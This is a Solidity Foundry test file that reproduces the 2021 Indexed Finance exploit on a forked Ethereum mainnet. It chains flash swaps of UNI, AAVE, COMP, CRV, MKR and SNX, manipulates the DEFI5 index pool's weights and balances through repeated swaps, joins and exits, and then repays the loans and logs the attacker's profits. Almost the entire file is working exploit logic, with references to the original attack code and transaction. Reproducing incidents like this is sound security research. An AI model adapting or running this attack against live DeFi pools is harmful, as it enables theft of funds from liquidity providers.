// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @author: https://github.com/Crypto-Virus/indexed-finance-exploit-example/blob/master/contracts/IndexedAttack.sol

// @Analyses:
// https://blocksecteam.medium.com/the-analysis-of-indexed-finance-security-incident-8a62b9799836
// https://twitter.com/Mudit__Gupta/status/1448884940964188167

// Attack tx: https://etherscan.io/tx/0x44aad3b853866468161735496a5d9cc961ce5aa872924c5d78673076b1cd95aa

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract BNum {
    uint256 internal constant BONE = 10 ** 18;

    // Maximum ratio of input tokens to balance for swaps.
    uint256 internal constant MAX_IN_RATIO = BONE / 2;

    function bmul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c0 = a * b;
        require(a == 0 || c0 / a == b, "ERR_MUL_OVERFLOW");
        uint256 c1 = c0 + (BONE / 2);
        require(c1 >= c0, "ERR_MUL_OVERFLOW");
        uint256 c2 = c1 / BONE;
        return c2;
    }
}

contract IndexedAttack is BNum, IUniswapV2Callee, Test {
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address private constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address private constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address private constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address private constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private constant CONTROLLER = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;
    address private constant DEFI5 = 0xfa6de2697D59E88Ed7Fc4dFE5A33daC43565ea41;

    uint256 count;
    bool attackBegan;
    address[] public borrowedTokens;
    uint256[] public borrowedAmounts;
    address[] public factories;
    address[] pairs;
    uint256[] public repayAmounts;
    uint256 private constant borrowedSushiAmount = 220_000 * 1e18;

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com", 13_417_948);
    }

    function testHack() public {
        address[] memory tokensBorrow = new address[](6);
        tokensBorrow[0] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        tokensBorrow[1] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
        tokensBorrow[2] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
        tokensBorrow[3] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        tokensBorrow[4] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
        tokensBorrow[5] = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;

        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 2_000_000 * 1e18;
        amounts[1] = 200_000 * 1e18;
        amounts[2] = 41_000 * 1e18;
        amounts[3] = 3_211_000 * 1e18;
        amounts[4] = 5800 * 1e18;
        amounts[5] = 453_700 * 1e18;

        address[] memory factories_ = new address[](6);
        factories_[0] = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
        factories_[1] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
        factories_[2] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
        factories_[3] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
        factories_[4] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
        factories_[5] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

        start(tokensBorrow, amounts, factories_);
    }

    function start(address[] memory _tokensBorrow, uint256[] memory _amounts, address[] memory _factories) internal {
        require(_tokensBorrow.length == _amounts.length && _factories.length == _amounts.length, "Invalid inputs");
        count = 0;
        attackBegan = false;
        borrowedTokens = _tokensBorrow;
        borrowedAmounts = _amounts;
        factories = _factories;

        getLoan();

        console.log("\nAttacker's final profits:");
        console.log("WETH %s", IERC20(WETH).balanceOf(address(this)) / 1e18);
        console.log("UNI %s", IERC20(UNI).balanceOf(address(this)) / 1e18);
        console.log("AAVE %s", IERC20(AAVE).balanceOf(address(this)) / 1e18);
        console.log("COMP %s", IERC20(COMP).balanceOf(address(this)) / 1e18);
        console.log("CRV %s", IERC20(CRV).balanceOf(address(this)) / 1e18);
        console.log("MKR %s", IERC20(MKR).balanceOf(address(this)) / 1e18);
        console.log("SNX %s", IERC20(SNX).balanceOf(address(this)) / 1e18);
        console.log("SUSHI %s", IERC20(SUSHI).balanceOf(address(this)) / 1e18);
    }

    function getLoan() internal {
        address _tokenBorrow = borrowedTokens[count];
        uint256 _amount = borrowedAmounts[count];
        address factoryAddr = factories[count];

        address pair = IUniswapV2Factory(factoryAddr).getPair(_tokenBorrow, WETH);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(_tokenBorrow, _amount, factoryAddr);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount, address factoryAddr) = abi.decode(_data, (address, uint256, address));
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factoryAddr).getPair(token0, token1);
        require(msg.sender == pair, "!pair");

        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 repayAmount = amount + fee;

        if (!attackBegan) {
            pairs.push(pair);
            repayAmounts.push(repayAmount);
            count++;
            if (count == borrowedAmounts.length) {
                attackBegan = true;
                attack();
                repayLoans();
            } else {
                getLoan();
            }
        } else {
            continueAttack();
            repaySushiLoan(pair, repayAmount);
        }
    }

    function attack() internal {
        console.log("Performing attack");

        IMarketCapSqrtController controller = IMarketCapSqrtController(CONTROLLER);
        IIndexPool indexPool = IIndexPool(DEFI5);
        controller.reindexPool(DEFI5);

        IERC20(UNI).approve(DEFI5, type(uint256).max);
        IERC20(AAVE).approve(DEFI5, type(uint256).max);
        IERC20(COMP).approve(DEFI5, type(uint256).max);
        IERC20(CRV).approve(DEFI5, type(uint256).max);
        IERC20(MKR).approve(DEFI5, type(uint256).max);
        IERC20(SNX).approve(DEFI5, type(uint256).max);
        IERC20(SUSHI).approve(DEFI5, type(uint256).max);

        // uint totalDenormWeight = indexPool.getTotalDenormalizedWeight();
        // console.log("Total denormalized weight: %s", totalDenormWeight / 1e18);

        (address tokenOut, uint256 value) = indexPool.extrapolatePoolValueFromToken();
        console.log("Extrapolated pool value from token: [%s, %s]", tokenOut, value / 1e18);

        uint256 tokenOutBalance = indexPool.getBalance(tokenOut);
        console.log("Initial Token balance: %s", tokenOutBalance / 1e18);

        for (uint256 i = 0; i < borrowedTokens.length; i++) {
            address tokenIn = borrowedTokens[i];
            if (tokenIn == tokenOut) {
                continue;
            }
            uint256 amountInRemain = borrowedAmounts[i];
            while (amountInRemain > 0) {
                uint256 amountIn = bmul(indexPool.getBalance(tokenIn), MAX_IN_RATIO);
                amountIn = amountInRemain < amountIn ? amountInRemain : amountIn;
                amountInRemain -= amountIn;
                console.log("Swapping %s of [%s] for [%s]", amountIn / 1e18, tokenIn, tokenOut);
                indexPool.swapExactAmountIn(tokenIn, amountIn, tokenOut, 0, type(uint256).max);
            }
            console.log("tokenOut balance: %s", indexPool.getBalance(tokenOut) / 1e18);
        }

        controller.updateMinimumBalance(indexPool, SUSHI);

        uint256 amountOutRemain = IERC20(tokenOut).balanceOf(address(this));
        while (amountOutRemain > 0) {
            uint256 amountOut = bmul(indexPool.getBalance(tokenOut), MAX_IN_RATIO);
            amountOut = amountOutRemain < amountOut ? amountOutRemain : amountOut;
            amountOutRemain -= amountOut;
            console.log("Minting DEFI5 tokens using %s [%s] tokens", amountOut / 1e18, tokenOut);
            indexPool.joinswapExternAmountIn(tokenOut, amountOut, 0);
        }

        getSushiLoan();
    }

    function getSushiLoan() internal {
        console.log("Requesting sushi loan");
        address pair = IUniswapV2Factory(SUSHI_FACTORY).getPair(SUSHI, WETH);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = SUSHI == token0 ? borrowedSushiAmount : 0;
        uint256 amount1Out = SUSHI == token1 ? borrowedSushiAmount : 0;

        console.log("borrowing this much sushi", borrowedSushiAmount / 1e18);
        bytes memory data = abi.encode(SUSHI, borrowedSushiAmount, SUSHI_FACTORY);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function continueAttack() internal {
        console.log("Continuing attacking");
        IERC20(SUSHI).transfer(DEFI5, borrowedSushiAmount);
        IIndexPool indexPool = IIndexPool(DEFI5);
        indexPool.gulp(SUSHI);

        uint256[] memory minAmountOut = new uint[](7);
        for (uint256 i = 0; i < 7; i++) {
            minAmountOut[i] = 0;
        }
        uint256 defi5Balance = IERC20(DEFI5).balanceOf(address(this));
        console.log("Burning %s DEFI5 tokens", defi5Balance / 1e18);
        indexPool.exitPool(defi5Balance, minAmountOut);
        printBalances();

        for (uint256 i = 0; i < 2; i++) {
            uint256 sushiRemain = IERC20(SUSHI).balanceOf(address(this));
            while (sushiRemain > 0) {
                uint256 amountIn = bmul(indexPool.getBalance(SUSHI), MAX_IN_RATIO);
                amountIn = sushiRemain < amountIn ? sushiRemain : amountIn;
                sushiRemain -= amountIn;
                console.log("Minting DEFI5 tokens using %s [%s] tokens", amountIn / 1e18, SUSHI);
                indexPool.joinswapExternAmountIn(SUSHI, amountIn, 0);
            }
            uint256 defi5Balance = IERC20(DEFI5).balanceOf(address(this));
            console.log("Burning %s DEFI5 tokens", defi5Balance / 1e18);
            indexPool.exitPool(defi5Balance, minAmountOut);
            printBalances();
        }
    }

    function repaySushiLoan(address pair, uint256 repayAmount) internal {
        // swap some MKR to WETH to cover repayment
        address[] memory path = new address[](2);
        path[0] = MKR;
        path[1] = WETH;
        IERC20(MKR).approve(UNISWAP_ROUTER, type(uint256).max);
        IUniswapV2Router01(UNISWAP_ROUTER).swapTokensForExactTokens(
            115 * 1e18, type(uint256).max, path, address(this), type(uint256).max
        );
        IERC20(SUSHI).transfer(pair, IERC20(SUSHI).balanceOf(address(this)));
        IERC20(WETH).transfer(pair, 115 * 1e18); // estimated 115 based on trial and error
    }

    function repayLoans() internal {
        console.log("Repaying loans");
        for (uint256 i = 0; i < borrowedAmounts.length; i++) {
            address token = borrowedTokens[i];
            uint256 amount = borrowedAmounts[i];
            address pair = pairs[i];
            uint256 repayAmount = repayAmounts[i];

            IERC20(token).transfer(pair, repayAmount);
        }
    }

    function printBalances() internal {
        console.log("\nContract balances are:");
        console.log("WETH %s", IERC20(WETH).balanceOf(address(this)) / 1e18);
        console.log("UNI %s", IERC20(UNI).balanceOf(address(this)) / 1e18);
        console.log("AAVE %s", IERC20(AAVE).balanceOf(address(this)) / 1e18);
        console.log("COMP %s", IERC20(COMP).balanceOf(address(this)) / 1e18);
        console.log("CRV %s", IERC20(CRV).balanceOf(address(this)) / 1e18);
        console.log("MKR %s", IERC20(MKR).balanceOf(address(this)) / 1e18);
        console.log("SNX %s", IERC20(SNX).balanceOf(address(this)) / 1e18);
        console.log("SUSHI %s", IERC20(SUSHI).balanceOf(address(this)) / 1e18);
    }
}

/* -------------------- Interface -------------------- */
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IIndexPool {
    function joinswapExternAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        uint256 minPoolAmountOut
    ) external returns (uint256); /* poolAmountOut */

    function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;

    function gulp(address token) external;

    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256, /* tokenAmountOut */ uint256); /* spotPriceAfter */

    function extrapolatePoolValueFromToken() external view returns (address, /* token */ uint256); /* extrapolatedValue */

    function getTotalDenormalizedWeight() external view returns (uint256);

    function getBalance(address token) external view returns (uint256);
}

interface IMarketCapSqrtController {
    function updateMinimumBalance(IIndexPool pool, address tokenAddress) external;
    function reindexPool(address poolAddress) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}
